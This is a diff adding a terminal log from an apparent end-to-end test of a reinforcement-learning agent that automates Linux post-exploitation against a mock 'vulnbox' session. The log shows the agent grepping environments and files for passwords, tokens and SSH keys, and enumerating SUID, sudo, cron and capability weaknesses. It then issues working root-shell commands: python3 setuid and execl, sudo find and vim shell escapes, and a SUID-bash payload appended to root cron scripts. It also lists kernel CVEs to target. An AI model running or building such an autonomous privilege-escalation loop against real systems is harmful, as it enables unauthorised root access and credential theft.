@@ -1,0 +1,438 @@
+﻿
+======================================================================
+  [1mEND-TO-END CLI TEST[0m
+======================================================================
+
+  [[32mPASS[0m] Model loads from checkpoint
+         [36mstate_dim=35[0m
+  [[32mPASS[0m] State dim matches
+         [36mexpected=35, got=35[0m
+
+  [33mRunning agent loop with MockSession...[0m
+
+[90m
+[*] Session log: C:\Users\Raghav\AppData\Local\Temp\postex_e2e_test\session_20260407_182442.jsonl[0m
+[90m[*] Starting agent loop. Press Ctrl+C to abort.
+[0m
+
+[1mStep 1/20[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m ?  |  [1mOS:[0m ?  |  [1mKernel:[0m ?
+  [1mChecked:[0m sudo:[90m.[0m  suid:[90m.[0m  capabi:[90m.[0m  writab:[90m.[0m  cron:[90m.[0m  creden:[90m.[0m  kernel:[90m.[0m
+  [1mFound:  [0m sudo:[90m.[0m  suid:[90m.[0m  capabi:[90m.[0m  writab:[90m.[0m  cron:[90m.[0m  creden:[90m.[0m  kernel:[90m.[0m
+------------------------------------------------------------------------
+
+  [1m> RL Suggested Action:[0m [32mCHECK_WRITABLE[0m
+  [90mDescription:[0m Find world-writable files and paths
+  [90mCommands:[0m
+    [36m$[0m [36mfind / -xdev -type d -perm -0002 2>/dev/null | head -n 200[0m
+  [90mAlternatives:[0m
+    [+60201787392.00] SEARCH_CREDENTIALS ù Search for credentials in files/env
+    [+60186542080.00] CHECK_SUID ù Search for SUID binaries
+
+  [36m$[0m find / -xdev -type d -perm -0002 2>/dev/null | head -n 200
+  [90m|[0m /tmp
+  [90m|[0m /var/tmp
+  [90m|[0m /dev/shm
+
+  [1mParser result:[0m [32mFOUND[0m
+    [90mwritable_paths:[0m /tmp, /var/tmp, /dev/shm
+
+[1mStep 2/20[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m ?  |  [1mOS:[0m ?  |  [1mKernel:[0m ?
+  [1mChecked:[0m sudo:[90m.[0m  suid:[90m.[0m  capabi:[90m.[0m  writab:[32mY[0m  cron:[90m.[0m  creden:[90m.[0m  kernel:[90m.[0m
+  [1mFound:  [0m sudo:[90m.[0m  suid:[90m.[0m  capabi:[90m.[0m  writab:[32mY[0m  cron:[90m.[0m  creden:[90m.[0m  kernel:[90m.[0m
+------------------------------------------------------------------------
+
+  [1m> RL Suggested Action:[0m [32mSEARCH_CREDENTIALS[0m
+  [90mDescription:[0m Search for credentials in files/env
+  [90mCommands:[0m
+    [36m$[0m [36menv | grep -iE 'pass|token|key|secret' 2>/dev/null[0m
+    [36m$[0m [36mgrep -RniE 'password|passwd|token|secret|apikey' /etc /opt /home 2>/dev/null | head -n 200[0m
+  [90mAlternatives:[0m
+    [+158582292480.00] CHECK_SUID ù Search for SUID binaries
+    [+157312630784.00] CHECK_CRON ù Enumerate cron jobs and scheduled tasks
+
+  [36m$[0m env | grep -iE 'pass|token|key|secret' 2>/dev/null
+  [90m|[0m DB_PASSWORD=supersecret123
+  [90m|[0m API_TOKEN=tok_live_abc123def456
+
+  [36m$[0m grep -RniE 'password|passwd|token|secret|apikey' /etc /opt /home 2>/dev/null | head -n 200
+  [90m|[0m /opt/app/config.ini:password=admin_plaintext_pass
+  [90m|[0m /home/backup/.ssh/id_rsa:-----BEGIN RSA PRIVATE KEY-----
+
+  [1mParser result:[0m [32mFOUND[0m
+    [90mcredentials:[0m DB_PASSWORD=supersecret123, API_TOKEN=tok_live_abc123def456, /opt/app/config.ini:password=admin_plaintext_pass, [SSH/RSA private key detected]
+    [90mcred_count:[0m 4
+    [90mcred_quality:[0m 1.0
+
+[1mStep 3/20[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m ?  |  [1mOS:[0m ?  |  [1mKernel:[0m ?
+  [1mChecked:[0m sudo:[90m.[0m  suid:[90m.[0m  capabi:[90m.[0m  writab:[32mY[0m  cron:[90m.[0m  creden:[32mY[0m  kernel:[90m.[0m
+  [1mFound:  [0m sudo:[90m.[0m  suid:[90m.[0m  capabi:[90m.[0m  writab:[32mY[0m  cron:[90m.[0m  creden:[32mY[0m  kernel:[90m.[0m
+------------------------------------------------------------------------
+
+  [1m> RL Suggested Action:[0m [32mCHECK_SUID[0m
+  [90mDescription:[0m Search for SUID binaries
+  [90mCommands:[0m
+    [36m$[0m [36mfind / -perm -4000 -type f 2>/dev/null[0m
+  [90mAlternatives:[0m
+    [+285325361152.00] CHECK_CRON ù Enumerate cron jobs and scheduled tasks
+    [+280403673088.00] CHECK_KERNEL ù Check kernel version for known exploits
+
+  [36m$[0m find / -perm -4000 -type f 2>/dev/null
+  [90m|[0m /usr/bin/passwd
+  [90m|[0m /usr/bin/su
+  [90m|[0m /usr/bin/find
+  [90m|[0m /usr/bin/python3
+  [90m|[0m /usr/bin/mount
+  [90m|[0m /usr/bin/umount
+
+  [1mParser result:[0m [32mFOUND[0m
+    [90mall_bins:[0m /usr/bin/passwd, /usr/bin/su, /usr/bin/find, /usr/bin/python3, /usr/bin/mount
+    [90mexploitable_bins:[0m /usr/bin/find, /usr/bin/python3
+
+[1mStep 4/20[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m ?  |  [1mOS:[0m ?  |  [1mKernel:[0m ?
+  [1mChecked:[0m sudo:[90m.[0m  suid:[32mY[0m  capabi:[90m.[0m  writab:[32mY[0m  cron:[90m.[0m  creden:[32mY[0m  kernel:[90m.[0m
+  [1mFound:  [0m sudo:[90m.[0m  suid:[32mY[0m  capabi:[90m.[0m  writab:[32mY[0m  cron:[90m.[0m  creden:[32mY[0m  kernel:[90m.[0m
+------------------------------------------------------------------------
+
+  [1m> RL Suggested Action:[0m [32mCHECK_CRON[0m
+  [90mDescription:[0m Enumerate cron jobs and scheduled tasks
+  [90mCommands:[0m
+    [36m$[0m [36mcat /etc/crontab 2>/dev/null[0m
+    [36m$[0m [36mls -la /etc/cron* 2>/dev/null[0m
+    [36m$[0m [36mcrontab -l 2>/dev/null[0m
+  [90mAlternatives:[0m
+    [+358247727104.00] CHECK_KERNEL ù Check kernel version for known exploits
+    [+352178831360.00] CHECK_SUDO ù Check sudo permissions (sudo -l)
+
+  [36m$[0m cat /etc/crontab 2>/dev/null
+  [90m|[0m SHELL=/bin/sh
+  [90m|[0m PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+  [90m|[0m 
+  [90m|[0m */5 * * * * root /opt/scripts/cleanup.sh
+  [90m|[0m 0 * * * * root /opt/scripts/backup.py
+
+  [36m$[0m ls -la /etc/cron* 2>/dev/null
+  [90m|[0m /etc/crontab
+
+  [36m$[0m crontab -l 2>/dev/null
+  [90m|[0m no crontab for www-data
+
+  [1mParser result:[0m [32mFOUND[0m
+    [90mcron_jobs:[0m */5 * * * * root /opt/scripts/cleanup.sh, 0 * * * * root /opt/scripts/backup.py
+    [90mpotentially_writable:[0m root /opt/scripts/cleanup.sh, root /opt/scripts/backup.py
+
+[1mStep 5/20[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m ?  |  [1mOS:[0m ?  |  [1mKernel:[0m ?
+  [1mChecked:[0m sudo:[90m.[0m  suid:[32mY[0m  capabi:[90m.[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[90m.[0m
+  [1mFound:  [0m sudo:[90m.[0m  suid:[32mY[0m  capabi:[90m.[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[90m.[0m
+------------------------------------------------------------------------
+
+  [1m> RL Suggested Action:[0m [32mCHECK_KERNEL[0m
+  [90mDescription:[0m Check kernel version for known exploits
+  [90mCommands:[0m
+    [36m$[0m [36muname -r[0m
+    [36m$[0m [36mcat /proc/version 2>/dev/null[0m
+  [90mAlternatives:[0m
+    [+424609349632.00] CHECK_SUDO ù Check sudo permissions (sudo -l)
+    [+419612229632.00] CHECK_CAPABILITIES ù Check Linux capabilities
+
+  [36m$[0m uname -r
+  [90m|[0m 5.15.0-56-generic
+
+  [36m$[0m cat /proc/version 2>/dev/null
+  [90m|[0m Linux version 5.15.0-56-generic (buildd@lcy02-amd64-006) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38)
+
+  [1mParser result:[0m [32mFOUND[0m
+    [90mkernel_version:[0m 5.15.0-56-generic
+    [90mknown_cves:[0m {'cve': 'CVE-2022-0847', 'name': 'Dirty Pipe'}
+
+[1mStep 6/20[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m ?  |  [1mOS:[0m ?  |  [1mKernel:[0m 5.15.0-56-generic
+  [1mChecked:[0m sudo:[90m.[0m  suid:[32mY[0m  capabi:[90m.[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+  [1mFound:  [0m sudo:[90m.[0m  suid:[32mY[0m  capabi:[90m.[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+------------------------------------------------------------------------
+
+  [1m> RL Suggested Action:[0m [32mCHECK_SUDO[0m
+  [90mDescription:[0m Check sudo permissions (sudo -l)
+  [90mCommands:[0m
+    [36m$[0m [36msudo -l 2>/dev/null[0m
+  [90mAlternatives:[0m
+    [+495370895360.00] CHECK_CAPABILITIES ù Check Linux capabilities
+    [+493149880320.00] IDENTIFY_USER ù Identify current user and privileges
+
+  [36m$[0m sudo -l 2>/dev/null
+  [90m|[0m Matching Defaults entries for www-data on vulnbox:
+  [90m|[0m     env_reset, mail_badpass
+  [90m|[0m 
+  [90m|[0m User www-data may run the following commands on vulnbox:
+  [90m|[0m     (ALL : ALL) NOPASSWD: /usr/bin/find
+  [90m|[0m     (ALL : ALL) NOPASSWD: /usr/bin/vim
+
+  [1mParser result:[0m [32mFOUND[0m
+    [90msudo_commands:[0m NOPASSWD: /usr/bin/find, NOPASSWD: /usr/bin/vim
+    [90mnopasswd_entries:[0m /usr/bin/find, /usr/bin/vim
+    [90mexploitable_bins:[0m /usr/bin/find, /usr/bin/vim
+
+[1mStep 7/20[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m ?  |  [1mOS:[0m ?  |  [1mKernel:[0m 5.15.0-56-generic
+  [1mChecked:[0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[90m.[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+  [1mFound:  [0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[90m.[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+------------------------------------------------------------------------
+
+  [1m> RL Suggested Action:[0m [32mCHECK_CAPABILITIES[0m
+  [90mDescription:[0m Check Linux capabilities
+  [90mCommands:[0m
+    [36m$[0m [36mgetcap -r / 2>/dev/null[0m
+  [90mAlternatives:[0m
+    [+551518011392.00] IDENTIFY_USER ù Identify current user and privileges
+    [+543802851328.00] IDENTIFY_OS ù Identify operating system and kernel version
+
+  [36m$[0m getcap -r / 2>/dev/null
+  [90m|[0m /usr/bin/python3 = cap_setuid+ep
+  [90m|[0m /usr/bin/ping = cap_net_raw+ep
+
+  [1mParser result:[0m [32mFOUND[0m
+    [90mexploitable_binaries:[0m /usr/bin/python3
+
+[1mStep 8/20[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m ?  |  [1mOS:[0m ?  |  [1mKernel:[0m 5.15.0-56-generic
+  [1mChecked:[0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+  [1mFound:  [0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+------------------------------------------------------------------------
+
+  [1m> RL Suggested Action:[0m [32mIDENTIFY_USER[0m
+  [90mDescription:[0m Identify current user and privileges
+  [90mCommands:[0m
+    [36m$[0m [36mid[0m
+    [36m$[0m [36mwhoami[0m
+  [90mAlternatives:[0m
+    [+631889854464.00] IDENTIFY_OS ù Identify operating system and kernel version
+    [+352082132992.00] EXPLOIT_KERNEL ù Exploit kernel vulnerability
+
+  [36m$[0m id
+  [90m|[0m uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+  [36m$[0m whoami
+  [90m|[0m www-data
+
+  [1mParser result:[0m [32mFOUND[0m
+    [90muid:[0m 33
+    [90musername:[0m www-data
+
+[1mStep 9/20[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m www-data  |  [1mOS:[0m ?  |  [1mKernel:[0m 5.15.0-56-generic
+  [1mChecked:[0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+  [1mFound:  [0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+------------------------------------------------------------------------
+
+  [1m> RL Suggested Action:[0m [32mIDENTIFY_OS[0m
+  [90mDescription:[0m Identify operating system and kernel version
+  [90mCommands:[0m
+    [36m$[0m [36muname -a[0m
+    [36m$[0m [36mcat /etc/os-release 2>/dev/null[0m
+  [90mAlternatives:[0m
+    [+372674658304.00] EXPLOIT_KERNEL ù Exploit kernel vulnerability
+    [+329995649024.00] EXPLOIT_CAP ù Exploit Linux capabilities
+
+  [36m$[0m uname -a
+  [90m|[0m Linux vulnbox 5.15.0-56-generic #62-Ubuntu SMP Tue Jan 24 14:03:05 UTC 2023 x86_64 GNU/Linux
+
+  [36m$[0m cat /etc/os-release 2>/dev/null
+  [90m|[0m PRETTY_NAME="Ubuntu 22.04.1 LTS"
+  [90m|[0m NAME="Ubuntu"
+  [90m|[0m VERSION_ID="22.04"
+  [90m|[0m ID=ubuntu
+
+  [1mParser result:[0m [32mFOUND[0m
+    [90mkernel_version:[0m 5.15.0-56-generic
+    [90mos_name:[0m Ubuntu 22.04.1 LTS
+
+[1mStep 10/20[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m www-data  |  [1mOS:[0m Ubuntu 22.04.1 LTS  |  [1mKernel:[0m 5.15.0-56-generic
+  [1mChecked:[0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+  [1mFound:  [0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+------------------------------------------------------------------------
+
+  [1m> RL Suggested Action:[0m [32mEXPLOIT_KERNEL[0m
+  [90mDescription:[0m Exploit kernel vulnerability
+  [90mCommands:[0m
+    [36m$[0m [90m# Kernel version: 5.15.0-56-generic[0m
+    [36m$[0m [36msearchsploit linux kernel 5.15.0  # run on attacker machine[0m
+    [36m$[0m [90m# High-priority CVEs to check:[0m
+    [36m$[0m [90m#   CVE-2022-0847 (Dirty Pipe)       kernels 5.8 û 5.16.11[0m
+    [36m$[0m [90m#   CVE-2016-5195 (Dirty COW)        kernels 2.6.22 û 4.8.3[0m
+    [36m$[0m [90m#   CVE-2021-4034 (PwnKit / pkexec)  most distros pre Jan 2022[0m
+    [36m$[0m [90m#   CVE-2021-3156 (sudo heap bof)    sudo < 1.9.5p2[0m
+    [36m$[0m [90m#   CVE-2022-2588 (route4 UAF)       kernels 5.4 û 5.19[0m
+    [36m$[0m [36muname -r && cat /proc/version[0m
+  [90mAlternatives:[0m
+    [+344826478592.00] EXPLOIT_CAP ù Exploit Linux capabilities
+    [+296026144768.00] EXPLOIT_CRON ù Exploit writable cron job
+
+  [36m$[0m searchsploit linux kernel 5.15.0  # run on attacker machine
+
+  [36m$[0m uname -r && cat /proc/version
+
+  [1mParser result:[0m [90mnot found[0m
+
+[1mStep 11/20[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m www-data  |  [1mOS:[0m Ubuntu 22.04.1 LTS  |  [1mKernel:[0m 5.15.0-56-generic
+  [1mChecked:[0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+  [1mFound:  [0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+------------------------------------------------------------------------
+
+  [1m> RL Suggested Action:[0m [32mEXPLOIT_CAP[0m
+  [90mDescription:[0m Exploit Linux capabilities
+  [90mCommands:[0m
+    [36m$[0m [36m/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'[0m
+  [90mAlternatives:[0m
+    [+298579230720.00] EXPLOIT_CRON ù Exploit writable cron job
+    [+284780494848.00] EXPLOIT_SUDO ù Exploit sudo misconfiguration
+
+  [36m$[0m /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+  [1mParser result:[0m [90mnot found[0m
+
+[1mStep 12/20[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m www-data  |  [1mOS:[0m Ubuntu 22.04.1 LTS  |  [1mKernel:[0m 5.15.0-56-generic
+  [1mChecked:[0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+  [1mFound:  [0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+------------------------------------------------------------------------
+
+  [1m> RL Suggested Action:[0m [32mEXPLOIT_CRON[0m
+  [90mDescription:[0m Exploit writable cron job
+  [90mCommands:[0m
+    [36m$[0m [36mls -la /opt/scripts/cleanup.sh  # check if writable[0m
+    [36m$[0m [36mecho 'cp /bin/bash /tmp/privesc && chmod +s /tmp/privesc' >> /opt/scripts/cleanup.sh  # inject payload, wait for cron, then run: /tmp/privesc -p[0m
+    [36m$[0m [36mls -la /opt/scripts/backup.py  # check if writable[0m
+    [36m$[0m [36mecho 'cp /bin/bash /tmp/privesc && chmod +s /tmp/privesc' >> /opt/scripts/backup.py  # inject payload, wait for cron, then run: /tmp/privesc -p[0m
+  [90mAlternatives:[0m
+    [+286946197504.00] EXPLOIT_SUDO ù Exploit sudo misconfiguration
+    [+282161545216.00] EXPLOIT_SUID ù Exploit SUID binary
+
+  [36m$[0m ls -la /opt/scripts/cleanup.sh  # check if writable
+
+  [36m$[0m echo 'cp /bin/bash /tmp/privesc && chmod +s /tmp/privesc' >> /opt/scripts/cleanup.sh  # inject payload, wait for cron, then run: /tmp/privesc -p
+
+  [36m$[0m ls -la /opt/scripts/backup.py  # check if writable
+
+  [36m$[0m echo 'cp /bin/bash /tmp/privesc && chmod +s /tmp/privesc' >> /opt/scripts/backup.py  # inject payload, wait for cron, then run: /tmp/privesc -p
+
+  [1mParser result:[0m [90mnot found[0m
+
+[1mStep 13/20[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m www-data  |  [1mOS:[0m Ubuntu 22.04.1 LTS  |  [1mKernel:[0m 5.15.0-56-generic
+  [1mChecked:[0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+  [1mFound:  [0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+------------------------------------------------------------------------
+
+  [1m> RL Suggested Action:[0m [32mEXPLOIT_SUDO[0m
+  [90mDescription:[0m Exploit sudo misconfiguration
+  [90mCommands:[0m
+    [36m$[0m [36msudo /usr/bin/find . -exec /bin/sh \; -quit[0m
+    [36m$[0m [36msudo /usr/bin/vim -c ':!/bin/sh'[0m
+  [90mAlternatives:[0m
+    [+283620540416.00] EXPLOIT_SUID ù Exploit SUID binary
+    [-20965523456.00] STOP ù Stop execution
+
+  [36m$[0m sudo /usr/bin/find . -exec /bin/sh \; -quit
+
+  [36m$[0m sudo /usr/bin/vim -c ':!/bin/sh'
+
+  [1mParser result:[0m [90mnot found[0m
+
+[1mStep 14/20[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m www-data  |  [1mOS:[0m Ubuntu 22.04.1 LTS  |  [1mKernel:[0m 5.15.0-56-generic
+  [1mChecked:[0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+  [1mFound:  [0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+------------------------------------------------------------------------
+
+  [1m> RL Suggested Action:[0m [32mEXPLOIT_SUID[0m
+  [90mDescription:[0m Exploit SUID binary
+  [90mCommands:[0m
+    [36m$[0m [36m/usr/bin/find . -exec /bin/sh -p \; -quit[0m
+    [36m$[0m [36m/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'[0m
+  [90mAlternatives:[0m
+    [-21060681728.00] STOP ù Stop execution
+
+  [36m$[0m /usr/bin/find . -exec /bin/sh -p \; -quit
+
+  [36m$[0m /usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+  [1mParser result:[0m [90mnot found[0m
+
+[1mStep 15/20[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m www-data  |  [1mOS:[0m Ubuntu 22.04.1 LTS  |  [1mKernel:[0m 5.15.0-56-generic
+  [1mChecked:[0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+  [1mFound:  [0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+------------------------------------------------------------------------
+
+  [1m> RL Suggested Action:[0m [33mSTOP[0m
+  [90mDescription:[0m Stop execution
+  [90m  (no commands ù decision-only action)[0m
+[33m
+[*] Policy suggests STOP.[0m
+[90m
+[*] Agent loop complete. Log: C:\Users\Raghav\AppData\Local\Temp\postex_e2e_test\session_20260407_182442.jsonl[0m
+
+------------------------------------------------------------------------
+  [1mPrivilege:[0m [33muser[0m  |  [1mUser:[0m www-data  |  [1mOS:[0m Ubuntu 22.04.1 LTS  |  [1mKernel:[0m 5.15.0-56-generic
+  [1mChecked:[0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+  [1mFound:  [0m sudo:[32mY[0m  suid:[32mY[0m  capabi:[32mY[0m  writab:[32mY[0m  cron:[32mY[0m  creden:[32mY[0m  kernel:[32mY[0m
+------------------------------------------------------------------------
+  [[32mPASS[0m] Agent loop completed without crash
+  [[32mPASS[0m] Commands were executed on session
+         [36m26 commands run[0m
+  [[32mPASS[0m] Session log file created
+         [36mlog files: ['session_20260407_182442.jsonl'][0m
+  [[32mPASS[0m] Log entries written
+         [36m14 entries[0m
+  [[32mPASS[0m] First log entry has action field
+         [36maction=CHECK_WRITABLE[0m
+  [[32mPASS[0m] Last log entry has state_after
+         [36mstate_after=privilege=user os=True user=True found=['sudo', 'suid', 'capabilities', 'writabl[0m
+  [[32mPASS[0m] Agent terminates gracefully
+         [36mroot=False, last=EXPLOIT_SUID, all_exploits_tried=True[0m
+  [[32mPASS[0m] Multiple distinct actions taken
+         [36mactions: ['CHECK_CAPABILITIES', 'CHECK_CRON', 'CHECK_KERNEL', 'CHECK_SUDO', 'CHECK_SUID', 'CHECK_WRITABLE', 'EXPLOIT_CAP', 'EXPLOIT_CRON', 'EXPLOIT_KERNEL', 'EXPLOIT_SUDO', 'EXPLOIT_SUID', 'IDENTIFY_OS', 'IDENTIFY_USER', 'SEARCH_CREDENTIALS'][0m
+  [[32mPASS[0m] Enumeration actions were taken
+  [[32mPASS[0m] Exploit actions were taken
+
+======================================================================
+  [32m[1mResults: 12 passed, 0 failed out of 12 checks[0m
+  [32mAll E2E checks passed![0m
+======================================================================
+
